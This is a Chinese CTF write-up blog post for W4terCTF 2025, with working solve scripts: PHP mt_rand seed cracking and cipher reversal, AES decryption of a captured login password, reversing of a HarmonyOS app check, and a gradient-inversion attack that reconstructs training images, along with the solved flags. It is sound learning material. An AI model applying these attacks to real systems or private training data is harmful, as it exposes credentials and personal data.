253430495677694834376a30334d7643476e42466b36457a5672714649736d326b626d4c33666f4b6e546c7a324c583857396331543079 \nEncrypted: 4f59355430674b38334631497243574c6b58394d46486d706d4249384b5a3230344d4c776d476a5431585a64774f5852747a507779\n```\n\n而在php语言中，mt_rand()生成随机数的方式一般是根据时间戳，如果固定了种子，调用mt_srand(seed)后，mt_rand()生成的随机数序列是不变的。可以得出第一次调用 mt_rand()得到的值等于r，即 1537101982。\n\n网上查阅资料可知，可从生成的随机数序列倒推种子。运行脚本后得到：\n\n![微信图片_20250504160818](微信图片_20250504160818.png)\n\n\n\n\n得出了几个满足条件的种子，正向地用这些种子生成随机数序列\n\n```php\n<?php\n\n$seeds = [997887998, 1741048634, 2753486577, 3026673652, 4268323880];\n\nforeach ($seeds as $seed) {\n    echo \"Seed: $seed\\n\";\n    mt_srand($seed);  \n    \n    $rand1 = mt_rand();  \n    $rand2 = mt_rand();  \n    $rand3 = mt_rand();  \n    echo \"rand1: $rand1, rand2: $rand2, rand3: $rand3\\n\";\n    $seed_enc = $rand2 + $rand3 * 1000000000;  //得到加密中需要使用的种子\n        \n    echo \"Seed Encrypted: $seed_enc\\n\";\n    }\n    echo \"\\n\";  \n?>\n\n//Seed Encrypted: 656981344086716842\n//Seed Encrypted: 139121407568507466\n//Seed Encrypted: 1604674039149147684\n//Seed Encrypted: 1782694585991376243\n//Seed Encrypted: 1520982203885732553\n```\n\n最后再根据原文的加密逻辑倒推flag：\n\n```php\n<?php\n\n$chars     = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!\";\n$chars_map = array_flip(str_split($chars));\n\nfunction decrypt($encrypted_text, $seed, $chars, $chars_map) {\n\n    //$encrypted_text = urldecode($encrypted_text);//url解码\n\n    $ch  = $encrypted_text[0];\n    $nh  = strpos($chars, $ch);//首字符的位置确定rand()产生的随机数\n    echo \"nh: {$nh}\\n\";\n    \n    $encrypted_body = substr($encrypted_text, 1);//实际加密数据\n\t\n    //根据加密逻辑倒推\n    $mdKey_full = md5((string)$seed . $ch);\n    $start      = $nh % 8;\n    $length     = $start + 7;           \n    $mdKey      = substr($mdKey_full, $start, $length);\n\n    $k    = 0;\n    $tmp  = '';\n    $keyL = strlen($mdKey);\n    for ($i = 0; $i < strlen($encrypted_body); $i++) {\n        $c       = $encrypted_body[$i];\n        $k       = $k % $keyL;\n        $ci      = $chars_map[$c];\n        // j = (ci - nh - ord(mdKey[k])) mod 64\n        $j       = ($ci - $nh - ord($mdKey[$k]) + 64*2) % 64;\n        $tmp    .= $chars[$j];\n        $k++;\n    }\n\n    return $tmp;\n}\n\n$seed    = '1782694585991376243';//手动更换计算得到的seed，wp为正确的seed\n$cipher1 = \"OY5T0gK83F1IrCWLkX9MFHmpmBI8KZ204MLwmGjT1XZdwOXRtzPwy\";\n//这里我已经先将加密的内容从转为转为了字节，并恢复了一些字符即url解码。\n\n$encoded = decrypt($cipher1, $seed, $chars, $chars_map);\n$flag    = base64_decode($encoded);\n\necho \"[+] Decrypted flag: {$flag}\\n\";\n?>\n\n```\n\n可成功解密flag\n\n![image-20250504162719128](image-20250504162719128.png)\n\n```\nW4terCTF{A1b_fROn7EnD_kEep5_8rEwinG}\n```\n\n\n\n# REVERSE\n\n## 网站管理员的登录密码\n\n根据提示需要找到**成功登录**的密码\n\n打开.pcapng，定位POST请求下的login流量包。\n\n![微信图片_20250504163434](微信图片_20250504163434.png)\n\n\n\n状态显示登陆成功，接下来只需要破解这段密码即可。\n\n![image-20250504163921288](image-20250504163921288.png)\n\n\n\n找到了密码的加密方式，用一个密钥和一个初始向量，AES加密\n\n对应地写个解密脚本\n\n```python \nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\nimport base64\n\n# 加密密钥和初始向量\nkey = bytes.fromhex(\"4ede70b7e44ffcc7cd912685defd05b1\")\niv = bytes.fromhex(\"c63b909a63ecdbbe813181e3c4734d87\")\n\n# 加密后的密文（Base64 编码）\nencrypted_text = \"gBjV3cE/UXEm7fXGXbQ4O7bXJEwi0y68SGNjkhuV2RW43lkkKm+xNQzpJDlfgCFOoAvOd0Ff1bg3Je4zbAAEdWpe8DmRdf5wH2F9vhAuDpg=\"\n\n# 将 Base64 编码的密文解码为字节\nencrypted_bytes = base64.b64decode(encrypted_text)\n\n# 创建 AES 解密器\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# 解密并去除填充\ntry:\n    decrypted_bytes = cipher.decrypt(encrypted_bytes)\n    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')\n    print(\"解密后的文本:\", decrypted_text)\nexcept ValueError as e:\n    print(\"解密失败:\", e)\n```\n\n![image-20250504164403519](image-20250504164403519.png)\n\n```\nFlag: W4terCTF{Fr0N73Nd!_17'5_my_5ymM3trlC_3ncrYpt1On!!!!!}\n```\n\n\n\n## 和谐小APP\n\n参考了这篇博客：[鸿蒙逆向 - SHCTF - Android？Harmony！题解 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1973595-1-1.html)\n\n先将.hap文件改为.zip后缀解压\n\n<img src=\"image-20250504164803915.png\" alt=\"image-20250504164803915\" style=\"zoom:50%;\" />\n\n\n找到.abc文件，用abc反编译工具打开。在 entryability 下定位到 W4terCTF：\n\n![image-20250504165220376](image-20250504165220376.png)\n\n这段反编译的结果大致是说，如果 trim == \"flag\"，trim2 ==\"W4terCTF{...}\"，就会触发彩蛋。而彩蛋是从“libentry.so”中导入的guessWhat函数在 输入是trim2，种子是20250428 的条件下生成的。\n\n```\norz = import { default as orz } from \"@normalized:Y&&&libentry.so&\";\nobj4.message = orz.guessWhat(trim2, 20250428);\n```\n\n那么就定位到 libentry.so 文件。用 IDA 打开，定位到guesswhat函数\n\n![image-20250504170855720](image-20250504170855720.png)\n\n找到了函数的实际入口地址，F5一下，反编译代码主要逻辑如下：\n\n```js\nnapi_get_value_string_utf8(a1, v18, s1, 128LL, v13);//字符串\nnapi_get_value_double(a1, *((_QWORD *)&v18 + 1), &v12);//数字\n                      \n//对传入的两个参数进行一些变换\nv4 = 5 * (int)v12;\n  v5 = 15 * (int)v12;\n  v6 = 20 * (int)v12;\n  v7 = 10 * (int)v12;\n  for ( i = 0LL; ; i += 20LL )\n  {\n    *(_DWORD *)((char *)s1 + i) ^= v3;\n    if ( i > 0x77 )\n      break;\n    *(_DWORD *)((char *)s1 + i + 5) ^= v4 + v3;\n    *(_DWORD *)((char *)s1 + i + 10) ^= v7 + v3;\n    *(_DWORD *)((char *)s1 + i + 15) ^= v5 + v3;\n    v3 += v6;\n  }\n\n//最后判断变换后的变量是否与target相等\nif (!bcmp(s1, &target, 0x80))\n    v8 = &unk_910;  // 成功提示\nelse\n    v8 = &unk_91C;  // 失败提示\n```\n\n所以下面就是要去找到 target\n\n![image-20250504172003259](image-20250504172003259.png)\n\n提取出target的所有字节，并基于上面的变换逻辑恢复出flag即可\n\n```python\nimport struct\n\ntarget_bytes = bytes([\n    0x57, 0x34, 0x74, 0x65, 0x72, 0x6F, 0xA8, 0x4E, 0x7D, 0x57,\n    0x10, 0xBD, 0x5F, 0x53, 0x79, 0xCB, 0xA1, 0x68, 0x4D, 0x44,\n    0xE2, 0x95, 0x62, 0x55, 0x53, 0x83, 0xAF, 0x63, 0x53, 0x45,\n    0x57, 0xA8, 0x7C, 0x4D, 0x76, 0x71, 0xBA, 0x67, 0x45, 0x55,\n    0x47, 0x93, 0x74, 0x6F, 0x55, 0xE2, 0xE8, 0x04, 0x06, 0x70,\n    0xC8, 0xED, 0x6F, 0x0D, 0x45, 0x99, 0xD5, 0x62, 0x42, 0x00,\n    0x10, 0xD2, 0x6B, 0x48, 0x00, 0x3C, 0xCE, 0x74, 0x4E, 0x00,\n    0x68, 0xCA, 0x7D, 0x54, 0x00, 0x94, 0xC6, 0x86, 0x5A, 0x00,\n    0xC0, 0xC2, 0x8F, 0x60, 0x00, 0xEC, 0xBE, 0x98, 0x66, 0x00,\n    0x18, 0xBB, 0xA1, 0x6C, 0x00, 0x44, 0xB7, 0xAA, 0x72, 0x00,\n    0x70, 0xB3, 0xB3, 0x78, 0x00, 0x9C, 0xAF, 0xBC, 0x7E, 0x00,\n    0xC8, 0xAB, 0xC5, 0x84, 0x00, 0xF4, 0xA7, 0xCE, 0x8A, 0x00,\n    0x20, 0xA4, 0xD7, 0x90, 0x00, 0x00, 0x00, 0x00\n])\n\nv11 = 20250428  #传入的数值参数\nv2 = 0\nv3 = 5 * v11\nv4 = 15 * v11\nv5 = 20 * v11\nv6 = 10 * v11\n\ns1 = bytearray(target_bytes)\n\nfor i in range(0, 0x80, 20):\n    if i + 15 + 4 > len(s1): \n        break\n\n    def xor_dword(offset, value):\n        pos = i + offset\n        val = struct.unpack_from('<I', s1, pos)[0]  \n        val ^= value\n        struct.pack_into('<I', s1, pos, val)\n\n    xor_dword(0, v2)\n    xor_dword(5, v3 + v2)\n    xor_dword(10, v6 + v2)\n    xor_dword(15, v4 + v2)\n\n    v2 += v5\n\n\nprint(f\"解密后的字节数据：\\n{s1}\")\n\n# 尝试以不同的编码解码\ntry:\n    result = s1.rstrip(b'\\x00').decode('utf-8')\n    print(f\"[+] 解密成功，flag/原文为：\\n{result}\")\nexcept UnicodeDecodeError:\n    print(\"[-] 解密失败，UTF-8 解码出错。尝试其他编码方式。\")\n    try:\n        result = s1.decode('latin1')\n        print(f\"[+] 使用 latin1 编码解密成功，flag/原文为：\\n{result}\")\n    except UnicodeDecodeError:\n        print(\"[-] 解密失败，latin1 解码出错。\")\n\n```\n\n![image-20250504172338683](image-20250504172338683.png)\n\n```\nFlag: W4terCTF{WHEN_yOUr_DReAMS_COME_AIivE_YoU'r3_Un5T0pp461E}\n```\n\n\n\n# AI\n\n## Gradient\n\nAI题先交给AI做，后面一定好好上创新实践训练课😭😭😭\n\n特别感谢出题人R1ck，因为深度学习的知识尚浅薄，靠R1ck提点才有今天的成功，也算是给这次比赛画上一个圆满的句号了。\n\n根据题目，找到参考的论文以及源代码。\n\n```python\n# 核心代码\ndef deep_leakage_from_gradients(model, origin_grad): \n  dummy_data = torch.randn(origin_data.size())\n  dummy_label =  torch.randn(dummy_label.size())\n  optimizer = torch.optim.LBFGS([dummy_data, dummy_label] )\n\n  for iters in range(300):\n    def closure():\n      optimizer.zero_grad()\n      dummy_pred = model(dummy_data) \n      dummy_loss = criterion(dummy_pred, F.softmax(dummy_label, dim=-1)) \n      dummy_grad = grad(dummy_loss, model.parameters(), create_graph=True)\n\n      grad_diff = sum(((dummy_grad - origin_grad) ** 2).sum() \\\n        for dummy_g, origin_g in zip(dummy_grad, origin_grad))\n      \n      grad_diff.backward()\n      return grad_diff\n    \n    optimizer.step(closure)\n    \n  return  dummy_data, dummy_label\n```\n\n恢复的方法大意是指：\n\n- 先随机初始化一个虚假的原始图像dummy_data和原始标签dummy_label\n- 用LBFGS优化器来优化dummy_data和dummy_label，让他们产生的梯度和原始的梯度越来越接近\n- 然后对dummy_data在神经网络上前向传播，用dummy_label作为目标衡量损失 loss\n- 计算dummy_data的梯度\n- 衡量dummy_grad和origin_grad的差异，然后对dummy_data和dummy_label反向传播来优化。\n- 最后返回输出和标签，还原原始样本。\n\n现有的文件是 model.pth 和一些 梯度文件 .grad\n\n```python\nimport torch\nimport torch.nn as nn\n# 占位模型类，用于加载（结构未知时也能绕过）\nclass R1ckNet(nn.Module):\n    def __init__(self):\n        super().__init__()\n\n# 加入到 safe_globals（新 PyTorch 安全机制）\nfrom torch.serialization import add_safe_globals\nadd_safe_globals({'R1ckNet': R1ckNet})\n \n \npthfile = r'E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth'            #.pth文件的路径\nmodel = torch.load(pthfile, map_location='cpu', weights_only=False)\nstate_dict = model.state_dict()   # 从模型对象中提取参数字典\nfor k, v in state_dict.items():\n    print(k, v.shape)\n\n#如果直接使用 torch.load 打印模型信息的话，会因为未知R1ckNet报错。\n#所以实例化一个类占位。\n```\n\n通过torch.load打印模型信息，输出了每个卷积层的权重以及全连接层的权重。\n\n- 卷积层权重：卷积核数量、输入通道数、卷积核大小。\n- 全连接层权重：输入与输出之间的连接。\n\n```python\n# 输出如下\n'''\nbody.0.weight torch.Size([12, 3, 5, 5])\nbody.0.bias torch.Size([12])\nbody.2.weight torch.Size([12, 12, 5, 5])\nbody.2.bias torch.Size([12])\nbody.4.weight torch.Size([12, 12, 5, 5])\nbody.4.bias torch.Size([12])\nbody.6.weight torch.Size([16, 12, 3, 3])\nbody.6.bias torch.Size([16])\nfc.0.weight torch.Size([100, 1024])\nfc.0.bias torch.Size([100])\n'''\n```\n\n拷打出题人后，发现对 .pth 文件挖掘不充分，进一步打印自定义类的超参数，得到一个hint\n\n```python\nimport argparse\nimport torch\nimport torch.nn as nn\nimport inspect\n\n# 如果你的模型类定义在某个模块里，请确保能 import 到它\n# 这里给出一个占位定义，实际加载时会使用 pickle 里的类定义\nclass R1ckNet(nn.Module):\n    def __init__(self, in_channels=3, conv1_out=12, conv2_out=12, conv3_out=12, conv4_out=16, fc_in=1024, num_classes=100):\n        super().__init__()\n        # 如果模型里定义了 hparams，它会在实例上\n        try:\n            self.hparams = {\n                \"in_channels\": in_channels,\n                \"conv1_out\": conv1_out,\n                \"conv2_out\": conv2_out,\n                \"conv3_out\": conv3_out,\n                \"conv4_out\": conv4_out,\n                \"fc_in\": fc_in,\n                \"num_classes\": num_classes,\n            }\n        except Exception:\n            pass\n        # 构建网络结构（可省略，仅为完整定义）\n        self.body = nn.Sequential(\n            nn.Conv2d(in_channels, conv1_out, 5, stride=2, padding=2), nn.Sigmoid(),\n            nn.Conv2d(conv1_out, conv2_out, 5, stride=2, padding=2), nn.Sigmoid(),\n            nn.Conv2d(conv2_out, conv3_out, 5, stride=1, padding=2), nn.Sigmoid(),\n            nn.Conv2d(conv3_out, conv4_out, 3, stride=1, padding=1), nn.Sigmoid(),\n            nn.Flatten()\n        )\n        self.fc = nn.Linear(fc_in, num_classes)\n\n    def forward(self, x):\n        x = self.body(x)\n        x = x.view(x.size(0), -1)\n        return self.fc(x)\n\n    def __repr__(self):\n        # 尝试打印 hparams，否则退回默认\n        if hasattr(self, 'hparams'):\n            params = \", \".join(f\"{k}={v}\" for k, v in self.hparams.items())\n            return f\"{self.__class__.__name__}({params})\"\n        else:\n            return super().__repr__()\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--pth', type=str, required=True,\n                        help='path to .pth file (whole-model or state_dict)')\n    args = parser.parse_args()\n\n    # 载入 .pth\n    loaded = torch.load(args.pth, map_location='cpu',weights_only=False)\n\n    # 判定类型\n    if isinstance(loaded, dict):\n        print(\"Detected state_dict. Instantiating R1ckNet and loading state_dict.\")\n        model = R1ckNet()\n        # 支持 checkpoint dict 包含 'model_state_dict'\n        sd = loaded.get('model_state_dict', loaded)\n        model.load_state_dict(sd)\n    else:\n        print(\"Detected full-model object. Using it directly.\")\n        model = loaded\n\n    model.eval()\n\n    # 1) 打印 repr（调用 __repr__）\n    print(\"\\n=== Model repr() ===\")\n    print(model)\n\n    # 2) 打印构造函数签名\n    sig = inspect.signature(model.__class__.__init__)\n    print(\"\\n=== Constructor signature ===\")\n    print(sig)\n\n    # 3) 如果有 hparams\n    if hasattr(model, 'hparams'):\n        print(\"\\n=== model.hparams ===\")\n        for k, v in model.hparams.items():\n            print(f\"  {k} = {v}\")\n    else:\n        print(\"\\nNo model.hparams attribute. Inspecting instance __dict__ for hyperparam-like entries...\")\n        for k, v in vars(model).items():\n            # 过滤模块和参数\n            if not isinstance(v, (nn.Module, nn.Parameter)) and not k.startswith('_'):\n                print(f\"  {k} = {v}\")\n\n    # 4) 列出所有参数名和形状\n    print(\"\\n=== model.named_parameters() ===\")\n    for name, param in model.named_parameters():\n        print(f\"{name:30s} | shape: {tuple(param.shape)}\")\n\n\nif __name__ == '__main__':\n    main()\n\n    \n# cmd line: python info.py --pth \"your.pth\"\n```\n\n![image-20250504203337339](image-20250504203337339.png)\n\n```\nhint: 7h3_84ck6r0und_0f_7h3_ch4r4c73r_1m463_15_wh173😝\n字符背景是白色的。\n```\n\n那么结合上述的神经网络的信息，就能导入梯度迭代恢复了。\n\n```python\n# -*- coding: utf-8 -*-\n# r1cknet_grad_attack.py\n# 单独训练某个样本\nimport argparse\nimport matplotlib.pyplot as plt\nimport torch\nimport torch.nn.functional as F\nfrom model import R1ckNet\nfrom utils import label_to_onehot, cross_entropy_for_onehot\nimport os\n\nparser = argparse.ArgumentParser(description='Deep Leakage from Gradients using R1ckNet.')\nparser.add_argument('--grad', type=str, required=True, help='Path to the .grad file')\nparser.add_argument('--out', type=str, default=None, help='Path to save recovered image')\nargs = parser.parse_args()\n\n\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nprint(\"Running on\", device)\n\n# 1. 加载原始梯度\nwith open(args.grad, 'rb') as f:\n    origin_grad = torch.load(f)\n\n# 2. 初始化模型并加载已有权重\n#net = R1ckNet().to(device)\n#这个也可以不用注释掉，就是和后面导入模型有点重复\n\n# 加载模型的state_dict\nnet = torch.load(r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth\", \n                 map_location=device,weights_only=False)\n\nnet.eval()\n\n# 3. 初始化 dummy 数据和标签\ndummy_data = torch.ones((1, 3, 32, 32), device=device, requires_grad=True)\n# 之前迭代损失很高就是因为没读懂提示，原来提示的作用是为了让初始化图像时尽可能接近恢复出的图像，这样就能降低损失。在比较少的迭代次数也能有效恢复。\n# 图片背景是白色，初始化为全白图像，即采用 torch.ones。\n# 之前一直模仿论文代码写的是 torch.rands，训练恢复的效果就很差。\ndummy_label = torch.randn((1, 100), device=device, requires_grad=True)\n\n# 使用 LBFGS 优化器\noptimizer = torch.optim.LBFGS([dummy_data, dummy_label])\nhistory = []\n\n# 4. 迭代优化以恢复图像和标签\nfor it in range(300):\n    def closure():\n        optimizer.zero_grad()\n        # 进行前向传播获取预测结果\n        pred = net(dummy_data)\n        #print(f\"Prediction shape: {pred.shape}\")  # 打印预测结果的形状\n\n        # 使用 softmax 转换标签为概率分布\n        soft_label = F.softmax(dummy_label, dim=-1)\n\n        # 计算交叉熵损失\n        loss = cross_entropy_for_onehot(pred, soft_label)\n\n        # 计算损失对模型参数的梯度\n        grads = torch.autograd.grad(loss, net.parameters(), create_graph=True)\n\n        # 计算恢复梯度与原始梯度之间的差异\n        diff = sum(((g_rec - g_orig) ** 2).sum() for g_rec, g_orig in zip(grads, origin_grad))\n        diff.backward()  # 反向传播计算差异的梯度\n\n        return diff\n\n    optimizer.step(closure)\n\n    if it % 10 == 0:\n        loss_val = closure().item()\n        print(f\"Iter {it:3d} | Loss: {loss_val:.4f}\")\n        history.append(dummy_data[0].detach().cpu())\n\n# 5. 可视化中间恢复图像\nplt.figure(figsize=(12, 8))\nfor i, img in enumerate(history[:30]):\n    plt.subplot(3, 10, i + 1)\n    plt.imshow(img.permute(1, 2, 0).clip(0, 1))\n    plt.title(f\"it={i * 10}\")\n    plt.axis('off')\nplt.tight_layout()\n\n# 自动命名图像文件\nif args.out:\n    plt.savefig(args.out)\nelse:\n    grad_filename = os.path.splitext(os.path.basename(args.grad))[0]  # 提取不带扩展名的文件名\n    out_path = f\"{grad_filename}.png\"\n    plt.savefig(out_path)\n    print(f\"Image saved to {out_path}\")\n\n\n# 6. 输出恢复标签\nwith torch.no_grad():\n    final_probs = F.softmax(dummy_label, dim=-1)\n    recovered_class = torch.argmax(final_probs, dim=-1).item()\nprint(\"Recovered class label:\", recovered_class)\n# 这个标签有大用，之前看到输出结果一直以为是迭代过程中一个比较突出的数值，还是学得太粗略了。\n```\n\n```python\n# model.py\nimport torch.nn as nn\n\nclass R1ckNet(nn.Module):\n    def __init__(self, in_channels=3, conv1_out=12, conv2_out=12, conv3_out=12,\n                 conv4_out=16, fc_in=1024, num_classes=100):\n        super().__init__()\n        self.body = nn.Sequential(\n            nn.Conv2d(in_channels, conv1_out, 5, stride=2, padding=2),\n            nn.Sigmoid(),\n            nn.Conv2d(conv1_out, conv2_out, 5, stride=2, padding=2),\n            nn.Sigmoid(),\n            nn.Conv2d(conv2_out, conv3_out, 5, stride=1, padding=2),\n            nn.Sigmoid(),\n            nn.Conv2d(conv3_out, conv4_out, 3, stride=1, padding=1),\n            nn.Sigmoid(),\n            nn.Flatten()\n        )\n        self.fc = nn.Linear(fc_in, num_classes)\n\n    def forward(self, x):\n        x = self.body(x)\n        x = x.view(x.size(0),-1)\n        # 展平这一步很重要，规范张量的形状以和权重矩阵的形状相匹配。感觉自己学习代码还是挺粗线条的💦💦💦\n        return self.fc(x)\n\n```\n\n```python \n# utils.py\n\nimport torch\nimport torch.nn.functional as F\n\n# 整数形式的分类标签转换为 One-Hot 编码。\n# dummy_label是可导的，转换one-hot方便计算和预测结果之间的损失\ndef label_to_onehot(target, num_classes=100):\n    target = torch.unsqueeze(target, 1)  # [B,1]\n    onehot = torch.zeros(target.size(0), num_classes, device=target.device)\n    onehot.scatter_(1, target, 1)\n    return onehot\n\n# 计算预测结果与 one-hot 标签之间的交叉熵损失。\ndef cross_entropy_for_onehot(pred, target):\n    return torch.mean(torch.sum(- target * F.log_softmax(pred, dim=-1), dim=1))\n\n```\n\n```python\n# -*- coding: utf-8 -*-\n# batch.py 批量训练梯度\nimport os\nimport torch\nimport torch.nn.functional as F\nimport matplotlib.pyplot as plt\nfrom model import R1ckNet\nfrom utils import cross_entropy_for_onehot\nfrom tqdm import tqdm  # 用于显示进度条\n\n# 配置参数\nGRAD_DIR = r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\grads_origin\"\nMODEL_PATH = r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth\"\nOUT_DIR = r\"E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\outputs1\"\nos.makedirs(OUT_DIR, exist_ok=True)\n\n# 设备选择\ndevice = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nprint(\"Running on\", device)\n\n# 加载模型\nnet = torch.load(MODEL_PATH, map_location=device,weights_only=False)\nnet.eval()\n\n# 遍历所有 .grad 文件\nfor grad_file in sorted(os.listdir(GRAD_DIR)):\n    if not grad_file.endswith(\".grad\"):\n        continue\n\n    grad_path = os.path.join(GRAD_DIR, grad_file)\n    out_name = os.path.splitext(grad_file)[0] + \".png\"\n    out_path = os.path.join(OUT_DIR, out_name)\n\n    # 加载原始梯度\n    with open(grad_path, 'rb') as f:\n        origin_grad = torch.load(f)\n\n    # 初始化 dummy 数据和标签\n    dummy_data = torch.ones((1, 3, 32, 32), device=device, requires_grad=True)\n    dummy_label = torch.randn((1, 100), device=device, requires_grad=True)\n\n    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])\n    history = []\n\n    # 迭代优化\n    for it in range(100):\n        def closure():\n            optimizer.zero_grad()\n            pred = net(dummy_data)\n            soft_label = F.softmax(dummy_label, dim=-1)\n            loss = cross_entropy_for_onehot(pred, soft_label)\n            grads = torch.autograd.grad(loss, net.parameters(), create_graph=True)\n            diff = sum(((g_rec - g_orig) ** 2).sum() for g_rec, g_orig in zip(grads, origin_grad))\n            diff.backward()\n            return diff\n\n        optimizer.step(closure)\n\n        if it %10 == 0:\n            loss_val = closure().item()\n            print(f\"Iter {it:3d} | Loss: {loss_val:.4f}\")\n            history.append(dummy_data[0].detach().cpu())\n\n    # 保存图像\n    plt.figure(figsize=(12, 8))\n    for i, img in enumerate(history[:30]):\n        plt.subplot(3, 10, i + 1)\n        plt.imshow(img.permute(1, 2, 0).clip(0, 1))\n        plt.title(f\"it={i * 10}\")\n        plt.axis('off')\n    plt.tight_layout()\n    plt.savefig(out_path)\n    plt.close()\n\n    # 输出标签（可选）\n    with torch.no_grad():\n        final_probs = F.softmax(dummy_label, dim=-1)\n        recovered_class = torch.argmax(final_probs, dim=-1).item()\n    print(f\"{grad_file} -> Class: {recovered_class}\")\n\n```\n\n\n\n然后就能预测图像了。\n\n注意预测过程中，有些图像会因为迭代次数过大而“矫枉过正”，所以针对某些损失依旧很大的图像可以适当降低迭代次数，单独进行训练。\n\n![image-20250504223254918](image-20250504223254918.png)\n\n最后恢复出了的图像如下：\n\n<img src=\"3.png\" alt=\"3\" style=\"zoom:25%;\" /><img src=\"1.png\" alt=\"1\" style=\"zoom:25%;\" /><img src=\"2.png\" alt=\"2\" style=\"zoom:25%;\" />\n\n<img src=\"31.png\" alt=\"31\" style=\"zoom:25%;\" /><img src=\"32.png\" alt=\"32\" style=\"zoom:25%;\" /><img src=\"4.png\" alt=\"4\" style=\"zoom:25%;\" />\n\n<img src=\"5.png\" alt=\"5\" style=\"zoom:25%;\" /><img src=\"6.png\" alt=\"6\" style=\"zoom:25%;\" /><img src=\"7.png\" alt=\"7\" style=\"zoom:25%;\" />\n\n<img src=\"8.png\" alt=\"8\" style=\"zoom:25%;\" /><img src=\"9.png\" alt=\"9\" style=\"zoom:25%;\" /><img src=\"10.png\" alt=\"10\" style=\"zoom:25%;\" />\n\n<img src=\"11.png\" alt=\"11\" style=\"zoom:25%;\" /><img src=\"12.png\" alt=\"12\" style=\"zoom:25%;\" /><img src=\"13.png\" alt=\"13\" style=\"zoom:25%;\" />\n\n<img src=\"14.png\" alt=\"14\" style=\"zoom:25%;\" /><img src=\"15.png\" alt=\"15\" style=\"zoom:25%;\" /><img src=\"16.png\" alt=\"16\" style=\"zoom:25%;\" />\n\n<img src=\"17.png\" alt=\"17\" style=\"zoom:25%;\" /><img src=\"18.png\" alt=\"18\" style=\"zoom:25%;\" /><img src=\"19.png\" alt=\"19\" style=\"zoom:25%;\" />\n\n<img src=\"20.png\" alt=\"20\" style=\"zoom:25%;\" /><img src=\"21.png\" alt=\"21\" style=\"zoom:25%;\" /><img src=\"22.png\" alt=\"22\" style=\"zoom:25%;\" />\n\n<img src=\"23.png\" alt=\"23\" style=\"zoom:25%;\" /><img src=\"24.png\" alt=\"24\" style=\"zoom:25%;\" /><img src=\"25.png\" alt=\"25\" style=\"zoom:25%;\" />\n\n<img src=\"26.png\" alt=\"26\" style=\"zoom:25%;\" /><img src=\"27.png\" alt=\"27\" style=\"zoom:25%;\" /><img src=\"28.png\" alt=\"28\" style=\"zoom:25%;\" />\n\n<img src=\"29.png\" alt=\"29\" style=\"zoom:25%;\" /><img src=\"30.png\" alt=\"30\" style=\"zoom:25%;\" />\n\n数据处理的比较乱。。。\n\n恢复出来发现并不是顺序可读的flag。\n\n想到了用时间判断梯度生成的先后，结果发现精确到毫秒级所有样本都是一模一样的。然后问ai说可以通过损失判断训练的先后，因为损失一般是收敛的，但并没有观察出什么规律。又莫名其妙发现.grad可以解压，有个serialization_id，还以为和梯度顺序有关，但其实只是训练设备的标号。最后才知道顺序和标签有关——\n\n（又重新训了一遍数据看标签的值）\n\n```python \n# 6. 输出恢复标签\nwith torch.no_grad():\n    final_probs = F.softmax(dummy_label, dim=-1)\n    recovered_class = torch.argmax(final_probs, dim=-1).item()\nprint(\"Recovered class label:\", recovered_class)\n```\n\n这个标签代表了梯度的顺序。\n\n需要注意的是，如果迭代时损失比较大，可能就不能使标签收敛到正确的值。所以也需要再调整迭代次数重新训练。\n\n因为数据处理的比较乱，则列了一个表格记录标签值\n\n![image-20250504224517508](image-20250504224517508.png)\n\n最后一个样本在恢复标签值时始终找不到合适的迭代次数，但好在通过标签值排序后已经恢复出了flag的大意：R1ck likes ai security，所以便没有重新训练该样本。\n\n历经千辛万苦得到了flag：\n\n```\nFlag: W4terCTF{R1ck_iik35_41_53cur17y}\n```\n\n虽然课没好好上，但是通过这次ai安全的题目感觉把之前欠的都补回来了。\n\n# 小结\n\n在比赛中的成长只有靠写WP才能沉淀。但是太拖延了几乎比完赛才开始动笔写。\n\n虽然只能做做简单题，但是能坚持在五一打比赛已经很了不起了😭😭👍\n\n相比去年只做出一道题，今年进步也算不小了，虽然有不少的功劳出自ai和出题人。（出题人们真的好强，真是学到了不少东西）\n\n感谢队友的鼎力相助，看到队友能挑战pwn题和hard题——仰慕.jpg\n\n比赛过的很快，五一也过得很快。是时候该补作业了。\n\n## 后记\n压线过二等。\n\n![alt text](list.png)","slug":"W4terCTF-2025","published":1,"updated":"2025-05-13T15:38:39.169Z","comments":1,"layout":"post","photos":[],"_id":"cmamofqz500058otk2yk817wq","content":"<h1 id=\"OSINT\"><a href=\"#OSINT\" class=\"headerlink\" title=\"OSINT\"></a>OSINT</h1><p>非常好玩的图寻题，但充分暴露出地理常识为0。幸运地抢了个三血。</p>\n<h2 id=\"海的那边是\"><a href=\"#海的那边是\" class=\"headerlink\" title=\"海的那边是\"></a>海的那边是</h2><p>POV：<strong>羡慕出题人在海边度假</strong></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193131.jpg\"\n                      alt=\"alt text\"\n                ></p>\n<p>因为对出题人在群里说正在San Diego的印象比较深，马上定位图片位置大概就是La Jolla。</p>\n<h3 id=\"task1\"><a href=\"#task1\" class=\"headerlink\" title=\"task1\"></a>task1</h3><p>保存图片后查看图片属性</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250503175742770.png\"\n                      alt=\"alt text\"\n                ><br>ans：<u><strong>20250427</strong></u></p>\n<h3 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193419.png\"\n                      alt=\"alt text\"\n                